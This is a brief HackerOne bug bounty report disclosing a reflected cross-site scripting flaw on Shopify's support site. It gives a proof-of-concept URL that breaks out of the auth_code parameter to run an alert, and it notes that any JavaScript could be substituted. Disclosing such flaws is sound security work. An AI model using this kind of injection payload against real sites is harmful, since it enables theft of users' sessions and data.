# HackerOne Report: XSS on support.shopify.com
**Report ID:** 56760
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Hello! I would like to report about XSS on support.shopify.com domain.

Here is the PoC that gives alert box with "123" content: https://support.shopify.com/?auth_code=,%20alert(123));//&auth_type=phone\

You can change "alert(123)" in URL to any JavaScript code You want to be executed.

Thanks!


## Discussion & Remediation Timeline
